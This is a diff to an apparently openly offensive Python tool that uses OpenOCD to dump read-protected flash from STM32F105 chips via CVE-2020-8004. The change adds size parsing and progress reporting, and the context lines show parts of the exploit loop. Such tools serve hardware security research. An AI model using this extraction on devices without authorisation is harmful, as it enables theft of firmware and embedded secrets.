@@ -19,6 +19,7 @@
 
 import sys
 import math
+import time
 import argparse
 import struct
 import enum
@@ -225,8 +226,18 @@ if __name__ == '__main__':
         help='OpenOCD Tcl interface port')
     args = parser.parse_args()
 
+    def parse_length(val):
+        s = str(val).strip().lower()
+        if s.endswith('kb') or s.endswith('k'):
+            kb = int(s.rstrip('kb').rstrip('k'), 0)
+            return (kb * 1024) // WORD_SIZE
+        if s.endswith('b'):
+            b = int(s.rstrip('b'), 0)
+            return b // WORD_SIZE
+        return int(s, 0)
+
     start_address = int(args.address, 0)
-    length = int(args.length, 0)
+    length = parse_length(args.length)
     skip_value = args.value
     binary_output = args.binary
     num_exceptions = args.num_exceptions
@@ -256,9 +267,23 @@ if __name__ == '__main__':
     oocd.write_memory(UNDEF_INST_ADDR, [0xffff], word_length=16)
 
     end_address = start_address + (length * WORD_SIZE)
+    total_bytes = length * WORD_SIZE
     print(f"[*] Starting CVE-2020-8004 Extraction for STM32F105 ({num_exceptions} exceptions)...", file=sys.stderr)
+    print(f"[*] Range: 0x{start_address:08X} - 0x{end_address:08X} ({length} words, {total_bytes} bytes / {total_bytes/1024:.1f} KB)", file=sys.stderr)
 
-    for address in range(start_address, end_address, WORD_SIZE):
+    t_start = time.time()
+    last_update = t_start
+
+    for idx, address in enumerate(range(start_address, end_address, WORD_SIZE)):
+        now = time.time()
+        if (now - last_update) >= 1.0 or idx == (length - 1):
+            elapsed = now - t_start
+            rate = idx / elapsed if elapsed > 0 else 0
+            eta = (length - idx) / rate if rate > 0 else 0
+            pct = (idx / length) * 100
+            print(f"\r[*] Progress: {idx}/{length} words ({pct:.1f}%) | {idx*WORD_SIZE} B | {rate:.1f} words/s | ETA: {int(eta//60)}m {int(eta%60):02d}s ", end="", file=sys.stderr, flush=True)
+            last_update = now
+
         (vtor_address, exception_number) = calculate_vtor_exc(
             address, num_exceptions)
 
@@ -307,3 +332,6 @@ if __name__ == '__main__':
             sys.stdout.write(output_value)
 
         sys.stdout.flush()
+
+    elapsed = time.time() - t_start
+    print(f"\n[+] Extraction completed: {length} words ({total_bytes} B) in {int(elapsed//60)}m {int(elapsed%60):02d}s ({length/elapsed:.1f} words/s).", file=sys.stderr)
